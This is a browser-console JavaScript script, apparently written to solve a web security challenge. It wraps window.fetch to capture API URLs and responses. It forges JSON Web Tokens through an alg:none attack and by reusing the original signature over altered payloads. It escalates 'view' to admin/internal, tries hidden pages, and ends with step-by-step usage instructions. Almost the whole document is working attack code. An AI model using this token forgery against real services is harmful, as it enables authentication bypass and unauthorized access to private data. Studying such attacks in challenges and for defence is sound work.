// 折页挑战调试脚本 - 粘贴到浏览器控制台运行
(async () => {
  // === 工具函数 ===
  const b64url = (str) => btoa(str).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
  const b64urlDecode = (s) => atob(s.replace(/-/g, '+').replace(/_/g, '/'));

  const HEADER_B64 = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6InByZXZpZXctZ2F0ZXdheSJ9';
  const ORIG_SIG = 'F6zQ7oxgG_2Gt1lgHwE3vop82xpWHgF9uy-orBoIg20';

  // 原始 payload
  const origPayload = { uid: "u_f68a74f1", round: "2", page: "summary", view: "public" };
  console.log('原始 payload:', origPayload);

  // === 1. 拦截 fetch/XHR，捕获真实 API 地址 ===
  const origFetch = window.fetch;
  window.fetch = async (...args) => {
    const url = typeof args[0] === 'string' ? args[0] : args[0]?.url;
    const opts = args[1] || {};
    console.log('>>> FETCH:', opts.method || 'GET', url);
    if (opts.body) console.log('>>> BODY:', opts.body);
    const resp = await origFetch(...args);
    const clone = resp.clone();
    try { console.log('<<< RESP:', resp.status, await clone.text()); } catch (e) { }
    return resp;
  };
  console.log('[*] fetch 拦截已启用，请点击"请求摘要"和"请求索引"按钮');
  console.log('[*] 观察控制台输出的 URL 格式，然后运行 window.__tryPages()');

  // === 2. alg:none 攻击 - 构造无签名 token ===
  const makeNoneToken = (payloadObj) => {
    const header = b64url(JSON.stringify({ alg: "none", typ: "JWT", kid: "preview-gateway" }));
    const payload = b64url(JSON.stringify(payloadObj));
    return header + '.' + payload + '.';
  };

  // === 3. 保持原签名，只改 payload（签名不匹配但试试） ===
  const makeKeepSigToken = (payloadObj) => {
    const payload = b64url(JSON.stringify(payloadObj));
    return HEADER_B64 + '.' + payload + '.' + ORIG_SIG;
  };

  // === 4. 尝试所有 page 变体 ===
  window.__tryPages = async () => {
    const pages = ['summary', 'index', 'memo', 'manifest'];
    const views = ['public', 'private', 'admin', 'internal'];

    console.log('\n=== 尝试 alg:none 攻击 ===');
    for (const page of pages) {
      const token = makeNoneToken({ ...origPayload, page });
      console.log(`[none] page=${page}:`, token.slice(0, 60) + '...');
    }

    console.log('\n=== 生成的 token（复制到输入框测试）===');
    for (const page of pages) {
      console.log(`\n--- page: ${page} (alg:none) ---`);
      console.log(makeNoneToken({ ...origPayload, page }));
      console.log(`--- page: ${page} (keep-sig) ---`);
      console.log(makeKeepSigToken({ ...origPayload, page }));
    }

    // 尝试不同 view
    console.log('\n=== 不同 view 的 token ===');
    for (const view of views) {
      console.log(`\n--- view: ${view} (alg:none) ---`);
      console.log(makeNoneToken({ ...origPayload, view }));
    }
  };

  // === 5. 如果拦截到了 API URL，自动尝试请求 ===
  window.__directRequest = async (baseUrl, token) => {
    console.log('\n=== 直接请求 API ===');
    const endpoints = ['summary', 'index', 'memo', 'manifest'];
    for (const ep of endpoints) {
      try {
        const url = baseUrl.replace(/\/(summary|index|memo|manifest)/, '/' + ep);
        console.log(`尝试: ${url}`);
        const r = await origFetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ token: token || document.querySelector('input,textarea')?.value })
        });
        console.log(`${ep}:`, r.status, await r.text());
      } catch (e) {
        console.log(`${ep}: 失败`, e.message);
      }
    }
  };

  // 立即运行 tryPages 生成 token
  window.__tryPages();

  console.log('\n=== 使用说明 ===');
  console.log('1. 先点"请求摘要"按钮，观察拦截到的 URL');
  console.log('2. 把上面 alg:none 的 token 复制到输入框，再点按钮测试');
  console.log('3. 拿到 URL 后运行: window.__directRequest("拦截到的URL")');
})();
